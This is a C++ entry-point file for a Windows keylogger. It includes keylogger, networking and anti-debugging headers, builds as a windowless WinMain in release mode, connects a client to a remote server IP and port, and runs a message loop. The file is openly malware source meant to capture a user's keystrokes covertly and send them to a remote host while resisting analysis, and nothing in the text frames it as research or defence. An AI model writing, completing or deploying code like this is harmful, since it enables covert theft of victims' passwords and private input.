#include "keylogger.h"
#include "kqnet.h"
#include "common.h"
#include <Windows.h>
#include "keylogger_antidebugg.h"
keylogger transKeys;

#ifdef _DEBUG

int main() {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#endif
  

    EnumWindows(EnumWindowsProc, 0);
    bool result = transKeys.client.Connect(server_ip, server_port);
    std::cout << result;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
